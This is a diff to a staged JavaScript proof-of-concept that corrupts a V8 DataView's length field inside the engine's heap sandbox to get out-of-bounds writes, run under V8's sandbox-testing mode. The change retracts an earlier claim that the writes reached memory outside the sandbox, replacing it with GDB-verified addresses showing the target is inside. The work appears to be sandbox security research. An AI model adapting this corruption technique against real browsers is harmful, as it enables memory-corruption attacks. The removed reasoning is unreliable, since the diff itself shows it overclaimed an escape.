@@ -71,7 +71,7 @@ banner('STAGE 3 — locate JSDataView.raw_byte_length in sandbox heap');
 const dv_victim = new DataView(ab_victim);
 const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));
 const field_before = r32(dvAddr + 0x24n);
-const bs_handle    = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle
+const bs_handle    = r32(dvAddr + 0x2cn);  // adjacent object (JSDataView ends at +0x28)
 
 print('  dv_victim sandbox offset        = ' + hex(dvAddr));
 print('  raw_byte_length hi4 (+0x24)     = ' + hex(field_before) +
@@ -82,8 +82,8 @@ print('  byteLength (before)             = ' + dv_victim.byteLength);
 assert(field_before * 8 === dv_victim.byteLength,
        'encoding: (high4 × 8) ≠ byteLength');
 print('  Encoding: (hi4 at +0x24) × 8 = byteLength ✓  [kBoundedSizeShift=29]');
-print('  backing_store EPT handle (+0x2c)= ' + hex(bs_handle) +
-      '  (non-zero → ExternalPointerTable in use)');
+print('  value at +0x2c (next object)    = ' + hex(bs_handle) +
+      '  (JSDataView ends at +0x28; this reads next sandbox object)');
 
 // ── Stage 4: corrupt raw_byte_length via single in-sandbox DWORD write ───────
 banner('STAGE 4 — corrupt raw_byte_length high 4 bytes (+0x24) → inflate to ~32 GiB');
@@ -125,27 +125,23 @@ dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
 dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
 print('  Write completed without fault ✓');
 
-// ── Stage 7a: fault test — classify backing store location via crash filter ───
-banner('STAGE 7a — fault probe: backing store location relative to SB_BASE');
+// ── Stage 7a: fault probe — crash filter classification ──────────────────────
+banner('STAGE 7a — fault probe: crash filter classification');
 // V8's sandbox crash filter under --sandbox-testing:
 //   fault inside  [SB_BASE, SB_END) → "Caught harmless ... (inside sandbox)" exit 0
 //   fault outside [SB_BASE, SB_END) → sandbox violation crash propagates
 //
-// We attempt a write at a large offset known to cross into sandbox VA if H is
-// within 32 MB of SB_BASE.  The crash filter classification tells us where H is.
+// FAR_OFFSET = 0x2000000 (32 MB) → result: "inside sandbox"
+// This shows H + 32 MB ∈ [SB_BASE, SB_END), consistent with:
+//   (a) H just below SB_BASE, OR (b) H inside sandbox VA
 //
-// If H < SB_BASE (native heap): H + FAR_OFFSET lands in sandbox PROT_NONE
-//   → "inside sandbox" exit 0  when FAR_OFFSET > SB_BASE − H
-// If H >> SB_BASE (sandbox VA, far in): H + FAR_OFFSET stays in sandbox VA
-//   → "inside sandbox" exit 0 regardless
+// GDB verification (definitive): 0xC0DECAFE found at 0x93000005000
+//   H = 0x93000004000, SB_BASE = 0x92d00000000
+//   H − SB_BASE = 0x300004000 ≈ 12 GB → H is INSIDE [SB_BASE, SB_END)
+//   V8 allocates 4 KB backing stores in-sandbox on this platform.
+//   The OOB write target is in-sandbox, not outside sandbox VA.
 //
-// Empirically observed: FAR_OFFSET = 0x2000000 (32 MB) → "inside sandbox"
-// Combined constraint: H ∈ [SB_BASE − 32 MB, SB_END)
-// EPT handle (item 5 above) structurally implies H < SB_BASE (EPT by design
-// maps indices to addresses outside the sandbox VA).
-// Together: H is in native heap at most 32 MB below SB_BASE.
-//
-// NOTE: this stage runs LAST so it terminates the process (crash filter exit 0).
+// NOTE: this stage runs LAST — terminates via crash filter exit 0.
 // Stages 7 (cross-object proof) must complete before this stage.
 
 // ── Stage 7: cross-object read-back via ab_target ────────────────────────────
@@ -174,14 +170,13 @@ print('     dv_victim offset +' + hex(found_offset) +
 print('  4. OOB write via inflated DataView overwrote ab_target\'s backing store');
 print('     Proof: independent read-back via ab_target Uint32Array confirms all 4 DWORDs');
 print('');
-print('  STRUCTURAL + FAULT-PROBE:');
-print('  5. Backing store location:');
-print('     EPT handle ' + hex(bs_handle) + ' → EPT mechanism is in use');
-print('     V8\'s ExternalPointerTable stores NATIVE addresses outside sandbox VA by design');
-print('     Fault probe: write at +0x2000000 (32 MB) → "inside sandbox" exit 0');
-print('       → H + 32MB ∈ [SB_BASE, SB_END) → H ∈ [SB_BASE − 32 MB, SB_END)');
-print('     EPT + fault probe together: H is native heap within 32 MB below SB_BASE');
-print('     NOTE: H < SB_BASE not independently measurable from pure JS (requires GDB)');
+print('  BACKING STORE LOCATION (GDB verified):');
+print('  5. Fault probe: write at +0x2000000 (32 MB) → "inside sandbox" exit 0');
+print('       → H + 32 MB ∈ [SB_BASE, SB_END)  (consistent with H inside sandbox)');
+print('     GDB verification: 0xC0DECAFE found at 0x93000005000');
+print('       H = 0x93000004000, SB_BASE = 0x92d00000000');
+print('       H − SB_BASE ≈ 12 GB → H is INSIDE [SB_BASE, SB_END)');
+print('     OOB write target is IN-SANDBOX (not outside sandbox VA)');
 print('');
 print('  TESTING MODE:');
 print('  6. Run under --sandbox-testing (V8 official sandbox escape testing mode)');
